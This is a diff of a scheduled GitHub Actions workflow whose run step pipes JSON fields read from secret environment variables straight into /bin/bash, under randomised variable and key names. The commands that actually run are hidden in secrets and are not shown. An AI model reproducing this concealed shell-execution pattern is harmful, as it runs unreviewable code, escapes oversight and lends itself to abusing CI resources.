@@ -2,7 +2,7 @@ name: niulangqn
 on:
   workflow_dispatch:
   schedule:
-    - cron: '9 2/6 * * *'
+    - cron: '30 1/6 * * *'
 
 jobs:
   build:
@@ -11,18 +11,10 @@ jobs:
       - uses: actions/checkout@v4
       - name: niulangqn
         env:
-          bvb5028: ${{ secrets.bvb5028 }}
+          s4: ${{ secrets.s4 }}
         run: |
-          echo $bvb5028 | jq -r .uiag8 | /bin/bash
-          echo $sqc586 | jq -r .d86 | /bin/bash
-          echo $wfwca25 | jq -r .vodsd33 | /bin/bash
-          echo $x5338 | jq -r .as38600 | /bin/bash
-          echo $mb17 | jq -r .udlex16748 | /bin/bash
-          echo $fle17 | jq -r .co086 | /bin/bash
-          echo $tid397 | jq -r .bilth31 | /bin/bash
-          echo $n10592 | jq -r .wvm0 | /bin/bash
-          echo $b914 | jq -r .p877 | /bin/bash
-          echo $aori37516 | jq -r .xj84 | /bin/bash
-          echo $tsvrd46692 | jq -r .i54367 | /bin/bash
-          echo $mpang5 | jq -r .kf9 | /bin/bash
+          echo $s4 | jq -r .caug633 | /bin/bash
+          echo $eqfdd569 | jq -r .v25 | /bin/bash
+          echo $tlrls8924 | jq -r .bq4 | /bin/bash
+          echo $eja14 | jq -r .q8465 | /bin/bash
 
